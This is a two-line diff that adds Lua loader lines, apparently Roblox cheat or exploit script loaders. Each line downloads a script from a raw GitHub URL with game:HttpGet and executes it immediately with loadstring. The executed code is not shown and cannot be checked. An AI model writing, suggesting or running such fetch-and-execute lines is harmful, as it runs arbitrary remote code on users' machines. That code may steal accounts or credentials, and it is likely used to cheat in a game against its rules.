@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qo0wSc7681/remade-script/lua/infyeird"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qo0wSc7681/madcity/main/script"))()
